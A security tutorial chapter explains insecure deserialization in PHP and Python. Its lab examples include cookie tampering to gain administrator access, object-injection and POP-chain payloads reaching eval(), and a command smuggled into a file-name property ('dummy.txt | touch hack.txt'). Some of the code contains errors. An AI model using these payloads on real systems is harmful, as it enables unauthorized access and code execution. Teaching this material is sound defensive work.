---
cover: ../.gitbook/assets/de-serialization.png
coverY: 0
---

# 👿 De-serialization Attack

## **Deserialization Attacks: Unmasking the Security Threat**

In the realm of programming languages like Java, PHP, ASP.NET, and Python, there's a vital need to represent complex data structures like arrays, lists, dictionaries, and objects in a serialized format. This serialized data can then be transmitted through streams and networks and, later, be reconstructed into the original form. This essential process is known as serialization. The resulting serialized data can be represented as binary or structured text, with formats like JSON and XML being commonly used in web applications. The opposite of serialization is deserialization, where serialized data is transformed back into its original object state.

### **Understanding Deserialization Attacks**

Deserialization attacks, sometimes referred to as insecure deserialization, involve exploiting vulnerabilities within the deserialization process by employing untrusted data. The goal is to manipulate an application's logic, gain unauthorized access, or potentially execute remote code (RCE). In this chapter, we'll explore three distinct scenarios of serialization vectors, focusing on PHP and Python object serialization, two widely used and accessible languages.

### **A Glimpse of Deserialization in Action**

Let's begin our journey by demystifying the serialization and deserialization process in PHP. This foundational understanding will serve as a solid base before diving into more advanced offensive strategies.

In PHP, we can start with a straightforward class that we wish to serialize for later deserialization:

```php
class myClass
{
    public $name = "demo";
    function __construct()
    {
        # ...some PHP code...#
    }
}
```

When we execute this script, it serializes the PHP class into the following string:

```php
O:7:"myClass":1:{s:4:"name";s:4:"demo";}
```

Similarly, in Python, we can achieve the same process using the default pickle serialization class:

```python
import pickle
my_data = {}
my_data['friends'] = ["Alice", "Bob"]
pickle_data = pickle.dumps(my_data)
print(pickle_data)
```

The output is an encoded string:

```python
b'\x80\x03}q\x00X\x07\x00\x00\x00friendsq\x01]q\x02(X\x05\x00\x00\x00aliceq\x03X\x03\x00\x00\x00bobq\x04es.'
```

With this serialized string, we can represent complex data structures as string representations. The power of deserialization allows us to reverse this process, swiftly accessing the array or object item

### **Insecure Deserialization: A Closer Look**

Insecure deserialization occurs when a serialized string is converted back into its original object in memory, using untrusted user inputs. When insufficient input validation is in place, this can lead to logic manipulation and, in severe cases, result in arbitrary code execution.

Web applications that employ serialization are particularly vulnerable to various attack vectors. Here are some common scenarios:

1. **Exploiting Application Logic**: Attackers can abuse an application's logic operations that depend on serialized objects, such as purchase actions.
2. **User Identification via Cookies**: Accepting user-supplied serialized objects in cookies to identify a user can be a point of vulnerability.
3. **Serialized Objects as Authentication Tokens**: In some cases, serialized objects are used as authentication tokens, making them a potential target for exploitation.
4. **Data Transfer Through Channels**: Serialized objects transmitted through streams, WebSockets, or WebRTC channels can be manipulated.
5. **File System Commands**: Serialized objects used as inputs may execute commands in the file system, leading to significant security risks.

Most programming languages provide native APIs and capabilities for serialization and deserialization, but many of these operations are inherently unsafe. The safety of deserialization depends on the application's logic context.

### **A Practical Scenario: PHP Object Injection**

To illustrate these concepts, let's consider a scenario where an application uses PHP object serialization to determine user application privileges. Here's a simplified example:

**Client Request:**

```http
GET /login.php HTTP/1.0
Host: vuln.lab
Cookie: data=a:2:{s:8:"username";s:4:"user";s:4:"guid";s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
Connection: close
```

**Server-Side Logic (PHP):**

```php
$a = unserialize($_COOKIES['data']);
if(isset($a['username']) && $a['username'] === 'administrator'){
    echo "Access Granted!";
}else{
    echo "NO PERMISSIONS GRANTED.";
}
```

In this scenario, an attacker could elevate their privileges by altering the cookie content from a regular user to an administrator:

**Original Serialized Object:**

```php
a:2:{s:8:"username";s:4:"user";s:4:"guid";s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
```

**Altered Serialized Object:**

```php
a:2:{s:8:"username";s:13:"administrator";s:4:"guid";s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
```

### **PHP Object Injection Vulnerabilities**

Attacks on PHP Object Injection vulnerabilities require two critical elements:

1. An insecure implementation of the `unserialize()` method, relying on client input (e.g., cookies, stored serialized data, or serialized request parameters).
2. The presence of a PHP magic method (e.g., `__wakeup` or `__destruct`) within a vulnerable class. These magic methods can be exploited to construct a malicious payload or "POP Chain."

In PHP, magic methods are identified by double underscores (`__`) and play pivotal roles in an application's lifecycle, as they can be invoked during specific events. Some commonly used magic methods in serialization include `__sleep`, `__wakeup`, `__destruct`, and `__toString`.

In PHP Object Injection attacks, magic methods are harnessed to build payloads, demonstrating how crucial understanding these methods is to comprehend the underlying vulnerabilities and their potential exploitation.

### **PHP Object Injection Explored**

In the world of PHP Object Injection, the presence of PHP magic methods becomes a crucial element in constructing malicious payloads. Let's delve deeper into a practical example where a vulnerable `unserialize()` function and a PHP magic method, `__wakeup`, converge to allow arbitrary PHP object injection into the application scope.

Consider the following class:

```php
class InsecureClass
{
    private $hook = "phpinfo();";
}
```

In this class, we observe the implementation of a PHP magic method, `__wakeup`, and the declaration of a vulnerable `unserialize()` function. When these conditions align, they create the potential for arbitrary PHP object injection within the application context.

To craft our payload, we can execute the following script:

```php
class InsecureClass
{
    private $hook = "phpinfo();";
}
print urlencode(serialize(new InsecureClass));
```

This results in the following serialized string:

```php
O:13:"InsecureClass":1:{s:19:"InsecureClasshook";s:10:"phpinfo();";}
```

After URL encoding, our final payload appears as:

```http
O%3A13%3A%22InsecureClass%22%3A1%3A%7Bs%3A19%3A%22%00InsecureClass%00hook%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D
```

Now, we can append our payload as a data query string value:

```http
GET /auth_check.php?data=O%3A13%3A%22InsecureClas… HTTP/1.0
Host: vuln.lab
Connection: close
```

As a result, the script will execute our payload command and return the output of `phpinfo()`. An essential point to remember in PHP serialization is that the method itself is not serialized and saved. Instead, only the class's name and its properties are serialized.

Please note that the payload has been shortened for readability, but in real-world scenarios, attackers may leverage more complex and malicious payloads to exploit PHP Object Injection vulnerabilities fully

### **Exploring Property-Oriented Programming (POP)**

Property-Oriented Programming (POP) is a powerful technique that enables the creation of POP chains. These chains grant control over all the properties of a deserialized object. In POP chains, magic methods serve as the initial "gadget" – code snippets borrowed from the codebase. These gadgets can then be linked together to achieve a specific goal, often involving code execution.

Let's illustrate this concept with a basic example. Suppose we encounter vulnerable code that implements the `__destruct()` magic method within our library, like this:

```php
class LoggerIO extends IO
{
    private $filename = "log.txt";
    # ...some PHP code... #
    public function __destruct(){
        $this->removeFile($this->fn);
    }
    public function removeFile($fn){
        $this->destroy($fn);
    }
}
# ...some PHP code... #
$user_data = unserialize($_GET['data']);
```

In this code, we define a class named `LoggerIO`, which inherits from a parent class `IO`. It also implements the magic method `__destruct()`, which internally calls the `removeFile()` method. Additionally, it sets the `filename` property to a predefined string, "log.txt." To grasp the vulnerability's impact, let's inspect the `IO` class:

```php
class IO {
    # ...some PHP code... #
    public function destroy($fn){
        system("rm ".$fn);
    }
}
```

So far, our initial gadget is the `__destruct()` magic method, which calls the `removeFile()` method. The `removeFile()` method then becomes our new gadget. Upon closer examination, we discover that the `destroy()` method is susceptible to classic remote code execution (RCE) vulnerabilities.

To exploit this vulnerability, we need to alter the value of the `LoggerIO` class property to a string like "log.txt | touch hack.txt." This alteration allows us to execute a command using the `destroy()` method within the `IO` class.

To create our final POP chain, we can utilize the following script:

```php
class LoggerIO
{
    public $fn = "dummy.txt | touch hack.txt";
}
print urlencode(serialize(new LoggerIO));
```

This script results in our final payload being submitted as the following serialized string:

```php
O:8:"LoggerIO":1:{s:2:"fn";s:26:"dummy.txt | touch hack.txt";}
```

In the next example, the declared magic methods in the classes do not contain code exploitable for our purposes. However, it is still possible to create POP chains in such cases. Consider the following classes:

```php
class LoadObjectInternal
{
    protected $obj;
    function __construct()
    {
        # ...some PHP code... #
    }
    function __wakeup()
    {
        if (isset($this->obj)) return $this->obj->run();
    }
}

class CodeLoad
{
    private $code;
    function run()
    {
        eval($this->code);
    }
}
# ...some PHP code... #
```

In the first block of code, we define a class named `LoadObjectInternal`, which invokes the `eval()` method of `obj` when the `__wakeup()` function is called. The second block of code describes the `CodeLoad` class, which has a private property named `code` containing the code string to be executed and a `run()` method that calls `eval()` on the given code string.

At first glance, this may appear complex and non-exploitable. However, to exploit it, we only need to overwrite the `code` property with our malicious payload and trigger the `LoadObjectInternal` class to create an instance of `CodeLoad` using the `__wakeup()` method.

Thus, we can employ the following script to generate our payload:

```php
class CodeLoad
{
    private $code = "phpinfo();";
}

class LoadObjectInternal
{
    protected $obj;
    function __construct()
    {
        $this->obj = new CodeLoad;
    }
}

print urlencode(serialize(new Example));
```

This script results in our final payload being submitted as the following serialized string:

```php
O:18:"LoadObjectInternal":1:{s:6:"*obj";O:8:"CodeLoad":1:{s:14:"CodeLoadcode";s:10:"phpinfo();";}}
```

**Tip:** If you are interested in uncovering deserialization vulnerabilities in more intricate PHP frameworks like CodeIgniter or Laravel, consider exploring the [PHPGGC tool on GitHub](https://github.com/ambionics/phpggc).

